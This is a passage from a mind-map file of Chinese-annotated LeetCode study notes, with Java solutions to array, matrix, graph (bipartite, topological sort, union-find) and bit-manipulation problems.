    for (int num : nums) {
        if (num != 0) {
            nums[idx++] = num;
        }
    }
    while (idx &lt; nums.length) {
        nums[idx++] = 0;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1616193097" CREATED="1754751555283" MODIFIED="1754751555285"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 改变矩阵维度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      566. Reshape the Matrix (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/reshape-the-matrix/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/reshape-the-matrix/description/">力扣</a>
    </p>
    <pre>Input:
nums =
[[1,2],
 [3,4]]
r = 1, c = 4
Output:
[[1,2,3,4]]
Explanation:
The row-traversing of nums is [1,2,3,4]. The new reshaped matrix is a 1 * 4 matrix, fill it row by row by using the previous list.</pre>
    <pre>public int[][] matrixReshape(int[][] nums, int r, int c) {
    int m = nums.length, n = nums[0].length;
    if (m * n != r * c) {
        return nums;
    }
    int[][] reshapedNums = new int[r][c];
    int index = 0;
    for (int i = 0; i &lt; r; i++) {
        for (int j = 0; j &lt; c; j++) {
            reshapedNums[i][j] = nums[index / n][index % n];
            index++;
        }
    }
    return reshapedNums;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_265798224" CREATED="1754751555285" MODIFIED="1754751555287"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 找出数组中最长的连续 1
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      485. Max Consecutive Ones (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/max-consecutive-ones/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/max-consecutive-ones/description/">力扣</a>
    </p>
    <pre>public int findMaxConsecutiveOnes(int[] nums) {
    int max = 0, cur = 0;
    for (int x : nums) {
        cur = x == 0 ? 0 : cur + 1;
        max = Math.max(max, cur);
    }
    return max;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1981407501" CREATED="1754751555287" MODIFIED="1754751555288"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 有序矩阵查找
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      240. Search a 2D Matrix II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/search-a-2d-matrix-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/search-a-2d-matrix-ii/description/">力扣</a>
    </p>
    <pre>[
   [ 1,  5,  9],
   [10, 11, 13],
   [12, 13, 15]
]</pre>
    <pre>public boolean searchMatrix(int[][] matrix, int target) {
    if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false;
    int m = matrix.length, n = matrix[0].length;
    int row = 0, col = n - 1;
    while (row &lt; m &amp;&amp; col &gt;= 0) {
        if (target == matrix[row][col]) return true;
        else if (target &lt; matrix[row][col]) col--;
        else row++;
    }
    return false;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1817716300" CREATED="1754751555289" MODIFIED="1754751555290"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 有序矩阵的 Kth Element
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      378. Kth Smallest Element in a Sorted Matrix ((Medium))
    </p>
    <p>
      <a href="https://leetcode.com/problems/kth-smallest-element-in-a-sorted-matrix/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/description/">力扣</a>
    </p>
    <pre>matrix = [
  [ 1,  5,  9],
  [10, 11, 13],
  [12, 13, 15]
],
k = 8,
return 13.</pre>
    <p>
      解题参考：<a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/discuss/85173">Share my thoughts and Clean Java Code</a>
    </p>
    <p>
      二分查找解法：
    </p>
    <pre>public int kthSmallest(int[][] matrix, int k) {
    int m = matrix.length, n = matrix[0].length;
    int lo = matrix[0][0], hi = matrix[m - 1][n - 1];
    while (lo &lt;= hi) {
        int mid = lo + (hi - lo) / 2;
        int cnt = 0;
        for (int i = 0; i &lt; m; i++) {
            for (int j = 0; j &lt; n &amp;&amp; matrix[i][j] &lt;= mid; j++) {
                cnt++;
            }
        }
        if (cnt &lt; k) lo = mid + 1;
        else hi = mid - 1;
    }
    return lo;
}</pre>
    <p>
      堆解法：
    </p>
    <pre>public int kthSmallest(int[][] matrix, int k) {
    int m = matrix.length, n = matrix[0].length;
    PriorityQueue&lt;Tuple&gt; pq = new PriorityQueue&lt;Tuple&gt;();
    for(int j = 0; j &lt; n; j++) pq.offer(new Tuple(0, j, matrix[0][j]));
    for(int i = 0; i &lt; k - 1; i++) { // 小根堆，去掉 k - 1 个堆顶元素，此时堆顶元素就是第 k 的数
        Tuple t = pq.poll();
        if(t.x == m - 1) continue;
        pq.offer(new Tuple(t.x + 1, t.y, matrix[t.x + 1][t.y]));
    }
    return pq.poll().val;
}
class Tuple implements Comparable&lt;Tuple&gt; {
    int x, y, val;
    public Tuple(int x, int y, int val) {
        this.x = x; this.y = y; this.val = val;
    }
    @Override
    public int compareTo(Tuple that) {
        return this.val - that.val;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_961516984" CREATED="1754751555290" MODIFIED="1754751555292"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      645. Set Mismatch (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/set-mismatch/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/set-mismatch/description/">力扣</a>
    </p>
    <pre>Input: nums = [1,2,2,4]
Output: [2,3]</pre>
    <pre>Input: nums = [1,2,2,4]
Output: [2,3]</pre>
    <p>
      最直接的方法是先对数组进行排序，这种方法时间复杂度为 O(NlogN)。本题可以以 O(N) 的时间复杂度、O(1) 空间复杂度来求解。
    </p>
    <p>
      主要思想是通过交换数组元素，使得数组上的元素在正确的位置上。
    </p>
    <pre>public int[] findErrorNums(int[] nums) {
    for (int i = 0; i &lt; nums.length; i++) {
        while (nums[i] != i + 1 &amp;&amp; nums[nums[i] - 1] != nums[i]) {
            swap(nums, i, nums[i] - 1);
        }
    }
    for (int i = 0; i &lt; nums.length; i++) {
        if (nums[i] != i + 1) {
            return new int[]{nums[i], i + 1};
        }
    }
    return null;
}
private void swap(int[] nums, int i, int j) {
    int tmp = nums[i];
    nums[i] = nums[j];
    nums[j] = tmp;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1090992386" CREATED="1754751555292" MODIFIED="1754751555294"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 找出数组中重复的数，数组值在 [1, n] 之间
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      287. Find the Duplicate Number (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/find-the-duplicate-number/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/find-the-duplicate-number/description/">力扣</a>
    </p>
    <p>
      要求不能修改数组，也不能使用额外的空间。
    </p>
    <p>
      二分查找解法：
    </p>
    <pre>public int findDuplicate(int[] nums) {
     int l = 1, h = nums.length - 1;
     while (l &lt;= h) {
         int mid = l + (h - l) / 2;
         int cnt = 0;
         for (int i = 0; i &lt; nums.length; i++) {
             if (nums[i] &lt;= mid) cnt++;
         }
         if (cnt &gt; mid) h = mid - 1;
         else l = mid + 1;
     }
     return l;
}</pre>
    <p>
      双指针解法，类似于有环链表中找出环的入口：
    </p>
    <pre>public int findDuplicate(int[] nums) {
    int slow = nums[0], fast = nums[nums[0]];
    while (slow != fast) {
        slow = nums[slow];
        fast = nums[nums[fast]];
    }
    fast = 0;
    while (slow != fast) {
        slow = nums[slow];
        fast = nums[fast];
    }
    return slow;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_860053705" CREATED="1754751555294" MODIFIED="1754751555296"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 数组相邻差值的个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      667. Beautiful Arrangement II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/beautiful-arrangement-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/beautiful-arrangement-ii/description/">力扣</a>
    </p>
    <pre>Input: n = 3, k = 2
Output: [1, 3, 2]
Explanation: The [1, 3, 2] has three different positive integers ranging from 1 to 3, and the [2, 1] has exactly 2 distinct integers: 1 and 2.</pre>
    <p>
      题目描述：数组元素为 1~n 的整数，要求构建数组，使得相邻元素的差值不相同的个数为 k。
    </p>
    <p>
      让前 k+1 个元素构建出 k 个不相同的差值，序列为：1 k+1 2 k 3 k-1 ... k/2 k/2+1.
    </p>
    <pre>public int[] constructArray(int n, int k) {
    int[] ret = new int[n];
    ret[0] = 1;
    for (int i = 1, interval = k; i &lt;= k; i++, interval--) {
        ret[i] = i % 2 == 1 ? ret[i - 1] + interval : ret[i - 1] - interval;
    }
    for (int i = k + 1; i &lt; n; i++) {
        ret[i] = i + 1;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_40734507" CREATED="1754751555296" MODIFIED="1754751555297"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 数组的度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      697. Degree of an Array (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/degree-of-an-array/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/degree-of-an-array/description/">力扣</a>
    </p>
    <pre>Input: [1,2,2,3,1,4,2]
Output: 6</pre>
    <p>
      题目描述：数组的度定义为元素出现的最高频率，例如上面的数组度为 3。要求找到一个最小的子数组，这个子数组的度和原数组一样。
    </p>
    <pre>public int findShortestSubArray(int[] nums) {
    Map&lt;Integer, Integer&gt; numsCnt = new HashMap&lt;&gt;();
    Map&lt;Integer, Integer&gt; numsLastIndex = new HashMap&lt;&gt;();
    Map&lt;Integer, Integer&gt; numsFirstIndex = new HashMap&lt;&gt;();
    for (int i = 0; i &lt; nums.length; i++) {
        int num = nums[i];
        numsCnt.put(num, numsCnt.getOrDefault(num, 0) + 1);
        numsLastIndex.put(num, i);
        if (!numsFirstIndex.containsKey(num)) {
            numsFirstIndex.put(num, i);
        }
    }
    int maxCnt = 0;
    for (int num : nums) {
        maxCnt = Math.max(maxCnt, numsCnt.get(num));
    }
    int ret = nums.length;
    for (int i = 0; i &lt; nums.length; i++) {
        int num = nums[i];
        int cnt = numsCnt.get(num);
        if (cnt != maxCnt) continue;
        ret = Math.min(ret, numsLastIndex.get(num) - numsFirstIndex.get(num) + 1);
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_813057817" CREATED="1754751555298" MODIFIED="1754751555299"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 对角元素相等的矩阵
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      766. Toeplitz Matrix (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/toeplitz-matrix/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/toeplitz-matrix/description/">力扣</a>
    </p>
    <pre>1234
5123
9512
In the above grid, the diagonals are &quot;[9]&quot;, &quot;[5, 5]&quot;, &quot;[1, 1, 1]&quot;, &quot;[2, 2, 2]&quot;, &quot;[3, 3]&quot;, &quot;[4]&quot;, and in each diagonal all elements are the same, so the answer is True.</pre>
    <pre>public boolean isToeplitzMatrix(int[][] matrix) {
    for (int i = 0; i &lt; matrix[0].length; i++) {
        if (!check(matrix, matrix[0][i], 0, i)) {
            return false;
        }
    }
    for (int i = 0; i &lt; matrix.length; i++) {
        if (!check(matrix, matrix[i][0], i, 0)) {
            return false;
        }
    }
    return true;
}
private boolean check(int[][] matrix, int expectValue, int row, int col) {
    if (row &gt;= matrix.length || col &gt;= matrix[0].length) {
        return true;
    }
    if (matrix[row][col] != expectValue) {
        return false;
    }
    return check(matrix, expectValue, row + 1, col + 1);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1587267791" CREATED="1754751555300" MODIFIED="1754751555301"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      11. 嵌套数组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      565. Array Nesting (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/array-nesting/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/array-nesting/description/">力扣</a>
    </p>
    <pre>Input: A = [5,4,0,3,1,6,2]
Output: 4
Explanation:
A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2.
One of the longest S[K]:
S[0] = {A[0], A[5], A[6], A[2]} = {5, 6, 2, 0}</pre>
    <p>
      题目描述：S[i] 表示一个集合，集合的第一个元素是 A[i]，第二个元素是 A[A[i]]，如此嵌套下去。求最大的 S[i]。
    </p>
    <pre>public int arrayNesting(int[] nums) {
    int max = 0;
    for (int i = 0; i &lt; nums.length; i++) {
        int cnt = 0;
        for (int j = i; nums[j] != -1; ) {
            cnt++;
            int t = nums[j];
            nums[j] = -1; // 标记该位置已经被访问
            j = t;
        }
        max = Math.max(max, cnt);
    }
    return max;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1167253205" CREATED="1754751555302" MODIFIED="1754751555303"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      12. 分隔数组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      769. Max Chunks To Make Sorted (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/max-chunks-to-make-sorted/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/max-chunks-to-make-sorted/description/">力扣</a>
    </p>
    <pre>Input: arr = [1,0,2,3,4]
Output: 4
Explanation:
We can split into two chunks, such as [1, 0], [2, 3, 4].
However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible.</pre>
    <p>
      题目描述：分隔数组，使得对每部分排序后数组就为有序。
    </p>
    <pre>public int maxChunksToSorted(int[] arr) {
    if (arr == null) return 0;
    int ret = 0;
    int right = arr[0];
    for (int i = 0; i &lt; arr.length; i++) {
        right = Math.max(right, arr[i]);
        if (right == i) ret++;
    }
    return ret;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1862681412" CREATED="1754750427129" MODIFIED="1754751555303" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%9B%BE.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    图
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1109467466" CREATED="1754751555304" MODIFIED="1754751555305"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二分图
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      如果可以用两种颜色对图中的节点进行着色，并且保证相邻的节点颜色不同，那么这个图就是二分图。
    </p>
  </body>
</html></richcontent>
<node ID="ID_957304281" CREATED="1754751555306" MODIFIED="1754751555307"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 判断是否为二分图
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      785. Is Graph Bipartite? (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/is-graph-bipartite/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/is-graph-bipartite/description/">力扣</a>
    </p>
    <pre>Input: [[1,3], [0,2], [1,3], [0,2]]
Output: true
Explanation:
The graph looks like this:
0----1
|    |
|    |
3----2
We can divide the vertices into two groups: {0, 2} and {1, 3}.</pre>
    <pre>Example 2:
Input: [[1,2,3], [0,2], [0,1,3], [0,2]]
Output: false
Explanation:
The graph looks like this:
0----1
| \  |
|  \ |
3----2
We cannot find a way to divide the set of nodes into two independent subsets.</pre>
    <pre>public boolean isBipartite(int[][] graph) {
    int[] colors = new int[graph.length];
    Arrays.fill(colors, -1);
    for (int i = 0; i &lt; graph.length; i++) {  // 处理图不是连通的情况
        if (colors[i] == -1 &amp;&amp; !isBipartite(i, 0, colors, graph)) {
            return false;
        }
    }
    return true;
}
private boolean isBipartite(int curNode, int curColor, int[] colors, int[][] graph) {
    if (colors[curNode] != -1) {
        return colors[curNode] == curColor;
    }
    colors[curNode] = curColor;
    for (int nextNode : graph[curNode]) {
        if (!isBipartite(nextNode, 1 - curColor, colors, graph)) {
            return false;
        }
    }
    return true;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_748319466" CREATED="1754751555308" MODIFIED="1754751555309"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      拓扑排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      常用于在具有先序关系的任务规划中。
    </p>
  </body>
</html></richcontent>
<node ID="ID_189026332" CREATED="1754751555310" MODIFIED="1754751555312"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 课程安排的合法性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      207. Course Schedule (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/course-schedule/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/course-schedule/description/">力扣</a>
    </p>
    <pre>2, [[1,0]]
return true</pre>
    <pre>2, [[1,0],[0,1]]
return false</pre>
    <p>
      题目描述：一个课程可能会先修课程，判断给定的先修课程规定是否合法。
    </p>
    <p>
      本题不需要使用拓扑排序，只需要检测有向图是否存在环即可。
    </p>
    <pre>public boolean canFinish(int numCourses, int[][] prerequisites) {
    List&lt;Integer&gt;[] graphic = new List[numCourses];
    for (int i = 0; i &lt; numCourses; i++) {
        graphic[i] = new ArrayList&lt;&gt;();
    }
    for (int[] pre : prerequisites) {
        graphic[pre[0]].add(pre[1]);
    }
    boolean[] globalMarked = new boolean[numCourses];
    boolean[] localMarked = new boolean[numCourses];
    for (int i = 0; i &lt; numCourses; i++) {
        if (hasCycle(globalMarked, localMarked, graphic, i)) {
            return false;
        }
    }
    return true;
}
private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked,
                         List&lt;Integer&gt;[] graphic, int curNode) {
    if (localMarked[curNode]) {
        return true;
    }
    if (globalMarked[curNode]) {
        return false;
    }
    globalMarked[curNode] = true;
    localMarked[curNode] = true;
    for (int nextNode : graphic[curNode]) {
        if (hasCycle(globalMarked, localMarked, graphic, nextNode)) {
            return true;
        }
    }
    localMarked[curNode] = false;
    return false;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_654120463" CREATED="1754751555313" MODIFIED="1754751555314"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 课程安排的顺序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      210. Course Schedule II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/course-schedule-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/course-schedule-ii/description/">力扣</a>
    </p>
    <pre>4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].</pre>
    <p>
      使用 DFS 来实现拓扑排序，使用一个栈存储后序遍历结果，这个栈的逆序结果就是拓扑排序结果。
    </p>
    <p>
      证明：对于任何先序关系：v-&gt;w，后序遍历结果可以保证 w 先进入栈中，因此栈的逆序结果中 v 会在 w 之前。
    </p>
    <pre>public int[] findOrder(int numCourses, int[][] prerequisites) {
    List&lt;Integer&gt;[] graphic = new List[numCourses];
    for (int i = 0; i &lt; numCourses; i++) {
        graphic[i] = new ArrayList&lt;&gt;();
    }
    for (int[] pre : prerequisites) {
        graphic[pre[0]].add(pre[1]);
    }
    Stack&lt;Integer&gt; postOrder = new Stack&lt;&gt;();
    boolean[] globalMarked = new boolean[numCourses];
    boolean[] localMarked = new boolean[numCourses];
    for (int i = 0; i &lt; numCourses; i++) {
        if (hasCycle(globalMarked, localMarked, graphic, i, postOrder)) {
            return new int[0];
        }
    }
    int[] orders = new int[numCourses];
    for (int i = numCourses - 1; i &gt;= 0; i--) {
        orders[i] = postOrder.pop();
    }
    return orders;
}
private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List&lt;Integer&gt;[] graphic,
                         int curNode, Stack&lt;Integer&gt; postOrder) {
    if (localMarked[curNode]) {
        return true;
    }
    if (globalMarked[curNode]) {
        return false;
    }
    globalMarked[curNode] = true;
    localMarked[curNode] = true;
    for (int nextNode : graphic[curNode]) {
        if (hasCycle(globalMarked, localMarked, graphic, nextNode, postOrder)) {
            return true;
        }
    }
    localMarked[curNode] = false;
    postOrder.push(curNode);
    return false;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1959064419" CREATED="1754751555315" MODIFIED="1754751555316"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      并查集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      并查集可以动态地连通两个点，并且可以非常快速地判断两个点是否连通。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1840347568" CREATED="1754751555316" MODIFIED="1754751555318"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 冗余连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      684. Redundant Connection (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/redundant-connection/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/redundant-connection/description/">力扣</a>
    </p>
    <pre>Input: [[1,2], [1,3], [2,3]]
Output: [2,3]
Explanation: The given undirected graph will be like this:
  1
 / \
2 - 3</pre>
    <p>
      题目描述：有一系列的边连成的图，找出一条边，移除它之后该图能够成为一棵树。
    </p>
    <pre>public int[] findRedundantConnection(int[][] edges) {
    int N = edges.length;
    UF uf = new UF(N);
    for (int[] e : edges) {
        int u = e[0], v = e[1];
        if (uf.connect(u, v)) {
            return e;
        }
        uf.union(u, v);
    }
    return new int[]{-1, -1};
}
private class UF {
    private int[] id;
    UF(int N) {
        id = new int[N + 1];
        for (int i = 0; i &lt; id.length; i++) {
            id[i] = i;
        }
    }
    void union(int u, int v) {
        int uID = find(u);
        int vID = find(v);
        if (uID == vID) {
            return;
        }
        for (int i = 0; i &lt; id.length; i++) {
            if (id[i] == uID) {
                id[i] = vID;
            }
        }
    }
    int find(int p) {
        return id[p];
    }
    boolean connect(int u, int v) {
        return find(u) == find(v);
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1803303625" CREATED="1754750427133" MODIFIED="1754751555318" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BD%8D%E8%BF%90%E7%AE%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    位运算
  </body>
</html>
</richcontent>
<node ID="ID_465944884" CREATED="1754751555319" MODIFIED="1754751555321"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      0. 原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>基本原理</strong>
    </p>
    <p>
      0s 表示一串 0，1s 表示一串 1。
    </p>
    <pre>x ^ 0s = x      x &amp; 0s = 0      x | 0s = x
x ^ 1s = ~x     x &amp; 1s = x      x | 1s = 1s
x ^ x = 0       x &amp; x = x       x | x = x</pre>
    <p>
      利用 x ^ 1s = ~x 的特点，可以将一个数的位级表示翻转；利用 x ^ x = 0 的特点，可以将三个数中重复的两个数去除，只留下另一个数。
    </p>
    <pre>1^1^2 = 2</pre>
    <p>
      利用 x &amp; 0s = 0 和 x &amp; 1s = x 的特点，可以实现掩码操作。一个数 num 与 mask：00111100 进行位与操作，只保留 num 中与 mask 的 1 部分相对应的位。
    </p>
    <pre>01011011 &amp;
00111100
--------
00011000</pre>
    <p>
      利用 x | 0s = x 和 x | 1s = 1s 的特点，可以实现设值操作。一个数 num 与 mask：00111100 进行位或操作，将 num 中与 mask 的 1 部分相对应的位都设置为 1。
    </p>
    <pre>01011011 |
00111100
--------
01111111</pre>
    <p>
      <strong>位与运算技巧</strong>
    </p>
    <p>
      n&amp;(n-1) 去除 n 的位级表示中最低的那一位 1。例如对于二进制表示 01011011，减去 1 得到 01011010，这两个数相与得到 01011010。
    </p>
    <pre>01011011 &amp;
01011010
--------
01011010</pre>
    <p>
      n&amp;(-n) 得到 n 的位级表示中最低的那一位 1。-n 得到 n 的反码加 1，也就是 -n=~n+1。例如对于二进制表示 10110100，-n 得到 01001100，相与得到 00000100。
    </p>
    <pre>10110100 &amp;
01001100
--------
00000100</pre>
    <p>
      n-(n&amp;(-n)) 则可以去除 n 的位级表示中最低的那一位 1，和 n&amp;(n-1) 效果一样。
    </p>
    <p>
      <strong>移位运算</strong>
    </p>
    <p>
      \&gt;\&gt; n 为算术右移，相当于除以 2n，例如 -7 \&gt;\&gt; 2 = -2。
    </p>
    <pre>11111111111111111111111111111001  &gt;&gt; 2
--------
11111111111111111111111111111110</pre>
    <p>
      \&gt;\&gt;\&gt; n 为无符号右移，左边会补上 0。例如 -7 \&gt;\&gt;\&gt; 2 = 1073741822。
    </p>
    <pre>11111111111111111111111111111001  &gt;&gt;&gt; 2
--------
00111111111111111111111111111111</pre>
    <p>
      \&lt;\&lt; n 为算术左移，相当于乘以 2n。-7 \&lt;\&lt; 2 = -28。
    </p>
    <pre>11111111111111111111111111111001  &lt;&lt; 2
--------
11111111111111111111111111100100</pre>
    <p>
      <strong>mask 计算</strong>
    </p>
    <p>
      要获取 111111111，将 0 取反即可，~0。
    </p>
    <p>
      要得到只有第 i 位为 1 的 mask，将 1 向左移动 i-1 位即可，1\&lt;\&lt;(i-1) 。例如 1\&lt;\&lt;4 得到只有第 5 位为 1 的 mask ：00010000。
    </p>
    <p>
      要得到 1 到 i 位为 1 的 mask，(1\&lt;\&lt;i)-1 即可，例如将 (1\&lt;\&lt;4)-1 = 00010000-1 = 00001111。
    </p>
    <p>
      要得到 1 到 i 位为 0 的 mask，只需将 1 到 i 位为 1 的 mask 取反，即 ~((1\&lt;\&lt;i)-1)。
    </p>
    <p>
      <strong>Java 中的位操作</strong>
    </p>
    <pre>static int Integer.bitCount();           // 统计 1 的数量
static int Integer.highestOneBit();      // 获得最高位
static String toBinaryString(int i);     // 转换为二进制表示的字符串</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1255081575" CREATED="1754751555321" MODIFIED="1754751555323"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 统计两个数的二进制表示有多少位不同
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ol>
      <li>
        Hamming Distance (Easy)
      </li>
    </ol>
    <p>
      <a href="https://leetcode.com/problems/hamming-distance/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/hamming-distance/">力扣</a>
    </p>
    <pre>Input: x = 1, y = 4
Output: 2
Explanation:
1   (0 0 0 1)
4   (0 1 0 0)
       ↑   ↑
The above arrows point to positions where the corresponding bits are different.</pre>
    <p>
      对两个数进行异或操作，位级表示不同的那一位为 1，统计有多少个 1 即可。
    </p>
    <pre>public int hammingDistance(int x, int y) {
    int z = x ^ y;
    int cnt = 0;
    while(z != 0) {
        if ((z &amp; 1) == 1) cnt++;
        z = z &gt;&gt; 1;
    }
    return cnt;
}</pre>
    <p>
      使用 z&amp;(z-1) 去除 z 位级表示最低的那一位。
    </p>
    <pre>public int hammingDistance(int x, int y) {
    int z = x ^ y;
    int cnt = 0;
    while (z != 0) {
        z &amp;= (z - 1);
        cnt++;
    }
    return cnt;
}</pre>
    <p>
      可以使用 Integer.bitcount() 来统计 1 个的个数。
    </p>
    <pre>public int hammingDistance(int x, int y) {
    return Integer.bitCount(x ^ y);
}</pre>
  </body>
</html></richcontent>
</node>
